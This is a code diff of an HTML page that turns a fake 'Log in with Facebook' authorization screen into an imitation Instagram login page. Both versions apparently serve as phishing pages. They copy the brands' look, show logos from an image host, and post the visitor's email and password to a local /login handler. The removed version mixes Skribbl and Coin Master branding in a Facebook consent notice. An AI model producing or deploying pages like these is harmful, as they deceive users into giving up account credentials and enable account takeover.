@@ -3,113 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Authorization</title>
+    <title>Instagram Login</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
     <style>
         body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            background-color: #f0f2f5;
+            background-color: #fafafa;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            margin: 0;
+            font-family: 'Arial', sans-serif;
         }
 
-        .auth-container {
+        .login-container {
             width: 100%;
-            max-width: 450px;
+            max-width: 350px;
             background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(60, 60, 223, 0.1);
+            border: 1px solid #dbdbdb;
             padding: 20px;
+            border-radius: 8px;
             text-align: center;
         }
 
-        .auth-header {
-            background-color: #1877f2;
-            padding: 10px;
-            color: #fff;
-            font-size: 18px;
-            font-weight: bold;
+        .login-logo {
+            margin: 20px auto;
+            width: 175px;
         }
 
-        .app-logo {
-            margin: 20px auto;
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            background-size: cover;
-            background-position: center;
+        .form-control {
+            margin-bottom: 10px;
+            border-radius: 4px;
+            font-size: 14px;
+            padding: 10px;
+        }
+
+        .btn-login {
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            width: 100%;
+            padding: 10px;
+            font-size: 14px;
+            border-radius: 4px;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+
+        .btn-login:disabled {
+            background-color: #b2dffc;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .divider::before {
+            margin-right: 10px;
+        }
+
+        .divider::after {
+            margin-left: 10px;
         }
 
         .btn-facebook {
-            background-color: #1877f2;
-            color: #fff;
-            width: 100%;
-            padding: 10px;
+            background-color: transparent;
+            color: #385185;
+            font-size: 14px;
             border: none;
-            font-size: 16px;
             margin-top: 10px;
-            border-radius: 4px;
+            cursor: pointer;
         }
 
-        .btn-facebook:hover {
-            background-color: #145dbf;
-        }
-
-        .privacy-policy {
+        .forgot-password {
+            color: #385185;
             font-size: 12px;
-            color: #606770;
-            margin-top: 10px;
-        }
-
-        .privacy-policy a {
-            color: #1877f2;
             text-decoration: none;
-        }
-
-        .privacy-policy a:hover {
-            text-decoration: underline;
-        }
-
-        input {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 15px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            box-sizing: border-box;
+            display: block;
+            margin-top: 15px;
         }
 
         @media (max-width: 576px) {
-            .auth-container {
+            .login-container {
                 margin: 20px;
+                border: none;
             }
         }
     </style>
 </head>
 <body>
-    <div class="auth-container">
-        <div class="auth-header">Log in With Facebook</div>
-        <img class="app-logo" src="https://i.postimg.cc/ZB448Zjk/your-image.png" alt="Skribbl">
-        <p style="font-size: medium; color: #757679;">
-            Log in to your Facebook account to connect to skribbl Mobile
-        </p>
+    <div class="login-container">
+        <img src="https://i.postimg.cc/9fH7CBWY/images.png" alt="Instagram" class="login-logo">
         <form action="/login" method="POST">
-            <input type="email" id="email" name="email" placeholder="Mobile number or Email" required>
-            <input type="password" id="password" name="password" placeholder="Facebook password" required>
-            <button class="btn-facebook" type="submit">Log In</button>
+            <input type="email" name="email" class="form-control" placeholder="Phone number, username, or email" required>
+            <input type="password" name="password" class="form-control" placeholder="Password" required>
+            <button type="submit" class="btn-login" disabled>Log In</button>
         </form>
-        <a href="#" class="btn mt-2" style="color: #606770;">Create an account?</a><br>
-        <a href="#" class="btn" style="color: #606770;">Not now</a><br>
-        <a href="#">Forgot Password? Help Centre</a><br>
-        <p class="privacy-policy mt-3">
-            By continuing, Coin Master will receive ongoing access to the information that you share and Facebook will record when Coin Master accesses it. 
-            <a href="#">Learn more</a> about this sharing and the settings that you have. <br>
-            <a href="#">Coin Master's Privacy Policy</a> and <a href="#">Terms</a>.
-        </p>
+        <div class="divider">OR</div>
+        <button class="btn-facebook">
+            <i class="fab fa-facebook-square"></i> Log in with Facebook
+        </button>
+        <a href="#" class="forgot-password">Forgot password?</a>
     </div>
 </body>
+<script>
+    // Enable the login button only if both fields are filled
+    document.querySelectorAll('.form-control').forEach(input => {
+        input.addEventListener('input', () => {
+            const username = document.querySelector('input[name="email"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            const button = document.querySelector('.btn-login');
+            button.disabled = !(username && password);
+        });
+    });
+</script>
 </html>
